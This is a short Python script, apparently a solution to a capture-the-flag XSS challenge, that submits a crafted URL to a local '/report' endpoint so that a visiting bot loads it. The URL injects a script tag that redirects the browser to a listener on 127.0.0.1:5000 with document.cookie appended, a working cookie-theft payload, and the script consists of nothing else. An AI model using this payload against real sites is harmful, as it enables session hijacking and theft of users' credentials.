import requests

data = {
    "url":"""/?html=
    <script>
        location.href = "http://127.0.0.1:5000/?"%2bdocument.cookie;
    </script>
    """
}

response = requests.post("http://127.0.0.1:30030/report", data=data)